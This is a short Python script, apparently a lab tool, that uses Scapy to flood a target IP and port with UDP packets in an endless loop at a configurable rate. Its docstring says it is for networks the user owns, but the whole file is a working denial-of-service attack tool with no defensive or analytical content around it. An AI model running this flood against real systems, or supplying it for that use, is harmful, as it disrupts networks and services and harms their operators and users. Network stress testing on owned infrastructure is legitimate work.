#!/usr/bin/env python3
"""UDP flood lab script. Use only on networks you own. Requires admin + Scapy."""

import argparse
import random
import sys
import time

from scapy.all import IP, UDP, send, Raw


def main() -> None:
    p = argparse.ArgumentParser()
    p.add_argument("target")
    p.add_argument("dport", type=int, nargs="?", default=5000)
    p.add_argument("--rate", type=float, default=500.0)
    args = p.parse_args()
    delay = 1.0 / max(args.rate, 1.0)
    payload = Raw(b"X" * 256)
    i = 0
    print(f"UDP flood → {args.target}:{args.dport}")
    while True:
        pkt = IP(dst=args.target) / UDP(sport=random.randint(1024, 65535), dport=args.dport) / payload
        send(pkt, verbose=0)
        i += 1
        if i % 200 == 0:
            print(f"  pkts {i}", flush=True)
        time.sleep(delay)


if __name__ == "__main__":
    main()
